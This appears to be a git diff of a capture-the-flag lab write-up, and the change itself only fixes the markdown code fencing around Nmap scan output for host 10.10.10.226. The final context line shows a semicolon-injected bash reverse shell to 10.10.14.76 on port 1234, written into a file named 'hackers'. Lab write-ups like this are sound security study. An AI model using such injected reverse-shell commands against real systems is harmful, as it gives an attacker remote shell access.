@@ -2,7 +2,7 @@
 
 ## Nmap Scan
 Let's start with a nmap scan to extract the open ports
-`
+```
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 09:38 EDT
 Nmap scan report for 10.10.10.226
 Host is up (0.16s latency).
@@ -39,6 +39,6 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.09 seconds
-`
+```
 
 echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.76/1234 0>&1' #" >> hackers
